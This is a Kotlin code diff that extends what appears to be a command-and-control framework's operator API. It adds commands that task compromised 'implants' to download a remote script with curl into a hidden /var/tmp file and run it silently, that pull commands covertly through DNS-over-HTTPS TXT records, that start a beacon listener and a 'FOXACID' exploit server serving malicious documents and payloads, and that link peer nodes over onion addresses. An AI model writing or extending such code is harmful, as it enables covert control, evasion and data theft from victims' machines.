@@ -78,6 +78,10 @@ class QcliApi {
                 "persistx" -> persistx(params)
                 "footprint" -> footprint(params)
                 "camshot" -> camshot(params)
+                "ghostdns" -> ghostdns(params)
+                "dohc2" -> dohc2(params)
+                "foxacid" -> foxacid(params)
+                "federation" -> federationCmd(params)
                 else -> JSONObject().put("error", "unknown cmd: $cmd")
             }
         } catch (e: Exception) {
@@ -193,6 +197,122 @@ class QcliApi {
         C2State.recordLoot(ip, sealed, "camshot", shot.size)
         C2State.audit("CAM", "camshot $ip -> ${sealed.name}")
         return JSONObject().put("sealed", sealed.name).put("bytes", shot.size)
+    }
+
+    // ---------------------------------------------------------------- ghostdns
+    /**
+     * GHOSTFANG-DNS — stage the DoH-egress agent and task implant(s) to pull
+     * it from /s/ghostdns (persistx-style task shape). Requires the
+     * operator-controlled 'domain'. When 'host' is blank the task fans out to
+     * every registered implant. Also runs a live doh_task_check against the
+     * operator's DNS TXT records (Python doh_task_check parity).
+     */
+    private fun ghostdns(params: JSONObject): JSONObject {
+        val domain = params.optString("domain", "").trim()
+        if (domain.isBlank()) {
+            throw IllegalArgumentException(
+                "'domain' param required (operator-controlled DNS zone for DoH egress)"
+            )
+        }
+        val host = params.optString("host", "").trim()
+        val c2 = c2HostPort()
+        // Stage the domain-flavored agent (Python generate_dns_agent parity).
+        val fn = File(C2State.qcliDir, "ghostdns.sh")
+        fn.writeText(Agents.ghostdnsSh(domain))
+        fn.setExecutable(true, false)
+        val task = JSONObject().put("act", "run").put(
+            "cmd",
+            "curl -s \"http://$c2/s/ghostdns?domain=$domain\" -o /var/tmp/.gn-qcli.sh; " +
+                "(sh /var/tmp/.gn-qcli.sh >/dev/null 2>&1 &)"
+        )
+        if (host.isBlank()) {
+            C2State.setTaskAll { task }
+            C2State.audit("C2", "GHOSTFANG-DNS staged for ALL implants (domain $domain)")
+        } else {
+            C2State.setTask(host, task)
+            C2State.audit("C2", "GHOSTFANG-DNS staged for $host (domain $domain)")
+        }
+        return JSONObject()
+            .put("staged", true)
+            .put("host", host.ifBlank { "*" })
+            .put("domain", domain)
+            .put("agent", fn.absolutePath)
+            .put("task_check", dohTaskCheck(domain, params.optString("host_id", "hq")) ?: JSONObject.NULL)
+    }
+
+    /** doh_task_check parity — read the next task from DNS TXT records. */
+    private fun dohTaskCheck(domain: String, hostId: String): JSONObject? {
+        return try {
+            for (name in listOf("$hostId.cmd.$domain", "cmd.$domain")) {
+                val r = Net.httpGet(
+                    "https://dns.google/resolve?name=$name&type=TXT",
+                    mapOf("accept" to "application/dns-json"),
+                    timeoutMs = 4000
+                )
+                if (!r.ok) continue
+                val answers = JSONObject(r.text()).optJSONArray("Answer") ?: continue
+                for (i in 0 until answers.length()) {
+                    val raw = answers.optJSONObject(i)?.optString("data")?.trim('"') ?: continue
+                    if (raw.startsWith("{")) return JSONObject(raw)
+                }
+            }
+            null
+        } catch (e: Exception) {
+            null
+        }
+    }
+
+    // ------------------------------------------------------------------ dohc2
+    /** DoH TXT beacon listener (POST /t stages, GET /?d=<id> fetch-and-clear). */
+    private fun dohc2(params: JSONObject): JSONObject {
+        return when (params.optString("action", "start").lowercase()) {
+            "start" -> {
+                val port = params.optInt("port", 5353)
+                if (!DoHC2.start(port)) {
+                    throw IllegalStateException("DoH beacon listener bind :$port failed")
+                }
+                DoHC2.status()
+            }
+            "stop" -> {
+                DoHC2.stop()
+                DoHC2.status()
+            }
+            else -> throw IllegalArgumentException("'action' must be 'start' or 'stop'")
+        }
+    }
+
+    // ---------------------------------------------------------------- foxacid
+    /** FOXACID exploit-server lifecycle (:8081 maldoc + /f staged payloads). */
+    private fun foxacid(params: JSONObject): JSONObject {
+        return when (params.optString("action", "start").lowercase()) {
+            "start" -> {
+                val port = params.optInt("port", 8081)
+                if (!FoxAcid.start(port)) {
+                    throw IllegalStateException("FOXACID bind :$port failed")
+                }
+                FoxAcid.status()
+            }
+            "stop" -> {
+                FoxAcid.stop()
+                FoxAcid.status()
+            }
+            else -> throw IllegalArgumentException("'action' must be 'start' or 'stop'")
+        }
+    }
+
+    // ------------------------------------------------------------- federation
+    /** Mesh status {identity, peers} — or merge a peer with {peer: id}. */
+    private fun federationCmd(params: JSONObject): JSONObject {
+        val peer = params.optString("peer", "").ifBlank { params.optString("onion", "") }.trim()
+        if (peer.isNotBlank()) {
+            val merged = Federation.addPeer(
+                JSONObject().put("id", peer).put("url", params.optString("url", ""))
+            )
+            return JSONObject().put("merged", merged)
+        }
+        return JSONObject()
+            .put("identity", Federation.identity())
+            .put("peers", Federation.peers())
     }
 
     companion object {
